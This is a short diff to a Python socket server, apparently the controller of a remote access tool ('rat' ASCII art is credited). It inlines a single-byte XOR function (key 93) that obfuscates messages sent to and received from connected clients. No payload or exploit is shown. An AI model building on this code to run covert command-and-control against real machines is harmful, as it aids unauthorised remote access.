@@ -11,7 +11,12 @@ import socket
 import sys
 import threading
 
-from core import transform
+def xor(text):
+    crypt = []
+    for i in range(len(text)):
+        crypt.append(chr(ord(text[i]) ^ 93))
+
+    return "".join(crypt)
 
 # ascii banner (Crawford2) - http://patorjk.com/software/taag/
 # ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
@@ -70,7 +75,7 @@ class Server(threading.Thread):
 
     def send_client(self, message, client):
         try:
-            enc_message = transform.xor(message)
+            enc_message = xor(message)
             client.conn.send(enc_message)
         except Exception as e:
             print 'Error: {}'.format(e)
@@ -78,7 +83,7 @@ class Server(threading.Thread):
     def recv_client(self, client):
         try:
             recv_data = client.conn.recv(4096)
-            print transform.xor(recv_data)
+            print xor(recv_data)
         except Exception as e:
             print 'Error: {}'.format(e)
 
